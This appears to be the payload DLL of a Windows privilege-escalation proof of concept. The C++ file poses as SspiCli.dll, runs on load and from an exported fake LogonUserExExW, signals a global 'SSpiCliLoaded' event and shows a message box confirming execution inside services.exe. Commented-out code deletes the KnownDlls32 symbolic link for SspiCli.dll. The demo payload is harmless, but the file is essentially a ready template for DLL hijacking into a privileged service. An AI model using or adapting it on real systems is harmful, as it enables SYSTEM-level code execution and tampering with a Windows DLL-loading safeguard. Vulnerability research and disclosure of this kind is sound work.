// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <stdio.h>
#include <wchar.h>
#include <Windows.h>
#include <shellapi.h>
#include <winternl.h>
#include <PathCch.h>
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "pathcch.lib")

#pragma warning(disable : 4996)
/*
typedef NTSTATUS(NTAPI _NtOpenSymbolicLinkObject)(
    _Out_ PHANDLE            LinkHandle,
    _In_  ACCESS_MASK        DesiredAccess,
    _In_  POBJECT_ATTRIBUTES ObjectAttributes
    );
typedef NTSTATUS (NTAPI _ZwMakeTemporaryObject)(
     HANDLE Handle
);
typedef NTSTATUS(WINAPI* _NtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
HMODULE hm = GetModuleHandle(L"ntdll.dll");
_ZwMakeTemporaryObject* ZwMakeTemporaryObject = (_ZwMakeTemporaryObject*)GetProcAddress(hm, "ZwMakeTemporaryObject");
_NtOpenSymbolicLinkObject* NtOpenSymbolicLinkObject = (_NtOpenSymbolicLinkObject*)GetProcAddress(hm, "NtOpenSymbolicLinkObject");
*/

void poc(HMODULE hm = NULL) {
    Wow64EnableWow64FsRedirection(FALSE);
    /*wchar_t mx[MAX_PATH + 12];
    wchar_t mx2[MAX_PATH + 12];
    if (GetModuleFileName(GetModuleHandle(L"SspiCli"), mx, MAX_PATH)) {
        PathCchRemoveFileSpec(mx, MAX_PATH);
        wcscpy(mx2, mx);
        wcscat(mx, L"\\no-cleanup");
        if (GetFileAttributes(mx) != INVALID_FILE_ATTRIBUTES)
        {
            OBJECT_ATTRIBUTES ob = { 0 };
            UNICODE_STRING unistr = { 0 };
            RtlInitUnicodeString(&unistr, L"\\KnownDlls32\\SspiCli.dll");
            HANDLE hlnk = NULL;
            InitializeObjectAttributes(&ob, &unistr, OBJ_CASE_INSENSITIVE, NULL, NULL);
            if (!NtOpenSymbolicLinkObject(&hlnk, DELETE, &ob)) {
                ZwMakeTemporaryObject(hlnk);
                CloseHandle(hlnk);
            }
        }
    }*/
    HANDLE hevent = OpenEvent(EVENT_ALL_ACCESS, FALSE, L"Global\\SSpiCliLoaded");
    if (hevent)
    {
		SetEvent(hevent);
		CloseHandle(hevent);
    }
    MessageBox(NULL, L"Hello from services.exe", NULL, MB_ICONASTERISK);
    ExitProcess(0);
    
}

extern "C" __declspec(dllexport) BOOL APIENTRY LogonUserExExW(void*) {

    poc();
    return FALSE;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        poc(hModule);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

